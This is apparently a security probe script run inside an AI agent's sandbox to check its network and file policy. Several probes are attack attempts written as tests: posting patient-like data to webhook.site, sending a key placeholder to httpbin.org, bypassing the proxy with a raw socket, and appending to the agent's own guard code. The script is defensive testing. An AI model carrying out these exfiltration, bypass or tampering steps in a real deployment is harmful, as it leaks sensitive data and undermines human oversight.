"""Security probes run *inside* the sandbox: each line should read ALLOWED or BLOCKED as expected.

    cat deploy/openshell/probe.py | openshell sandbox exec -n er-agent --no-tty -- /app/.venv/bin/python -
"""
import os
import socket
import subprocess

import httpx

results = []


def check(name, expect, fn):
    try:
        got = fn()
    except Exception as exc:  # connection refused / proxy denial surface as exceptions
        got = f"BLOCKED ({type(exc).__name__}: {str(exc)[:70]})"
    ok = got.startswith(expect)
    results.append(ok)
    print(f"{'✅' if ok else '❌'} expect {expect:7s} | {name}\n      → {got}")


def http(method, url, **kw):
    r = httpx.request(method, url, timeout=15, **kw)
    return f"ALLOWED (HTTP {r.status_code})" if r.status_code < 400 else f"BLOCKED (HTTP {r.status_code} {r.text[:60]!r})"


key = os.environ.get("NVIDIA_API_KEY", "")
data_key = os.environ.get("DATA_KEY", "")

check("1. real API keys are absent from the agent environment", "ALLOWED",
      lambda: "ALLOWED (placeholders only)" if key.startswith("openshell:resolve") and data_key.startswith("openshell:resolve")
      and "nvapi-" not in "".join(os.environ.values()) else "LEAKED")
check("2. Nemotron via NIM with placeholder bearer (proxy injects real key)", "ALLOWED",
      lambda: http("GET", "https://integrate.api.nvidia.com/v1/models", headers={"Authorization": f"Bearer {key}"}))
check("3. NEMC API with placeholder serviceKey (proxy injects real key)", "ALLOWED",
      lambda: http("GET", "http://apis.data.go.kr/B552657/ErmctInfoInqireService/getEgytListInfoInqire",
                   params={"serviceKey": data_key, "numOfRows": 1}))
check("4. exfiltrate patient data to an unknown host", "BLOCKED",
      lambda: http("POST", "https://webhook.site/abc", json={"patient": "45세 남성 손가락 절단", "loc": [37.57, 126.97]}))
check("5. send the key placeholder to another host", "BLOCKED",
      lambda: http("GET", f"https://httpbin.org/get?k={key}"))
check("6. write method on the read-only public-data API", "BLOCKED",
      lambda: http("POST", "http://apis.data.go.kr/B552657/ErmctInfoInqireService/getEgytListInfoInqire", params={"serviceKey": data_key}))
check("7. other service on the same public-data host", "BLOCKED",
      lambda: http("GET", "http://apis.data.go.kr/1360000/VilageFcstInfoService_2.0/getUltraSrtNcst", params={"serviceKey": data_key}))
# OpenShell matches binaries through the process tree, so a child of the agent's Python
# inherits its identity (documented behaviour). It still cannot leave the allowed L7 paths.
check("8. child process of the agent hitting a non-allowed path on an allowed host", "BLOCKED",
      lambda: "ALLOWED" if subprocess.run(["curl", "-sf", "-m", "10", "-X", "POST", "-H", f"Authorization: Bearer {key}",
                                           "https://integrate.api.nvidia.com/v1/embeddings", "-d", "{}"],
                                          capture_output=True).returncode == 0 else "BLOCKED (L7 path denied)")
check("9. bypass the proxy with a raw socket", "BLOCKED",
      lambda: (socket.create_connection(("1.1.1.1", 443), timeout=5).close(), "ALLOWED (raw TCP connected)")[1])
check("10. tamper with agent code in /app", "BLOCKED",
      lambda: (open("/app/src/er_agent/guard.py", "a").write("#"), "ALLOWED (code modified)")[1])

print(f"\n{sum(results)}/{len(results)} probes behaved as the policy intends")
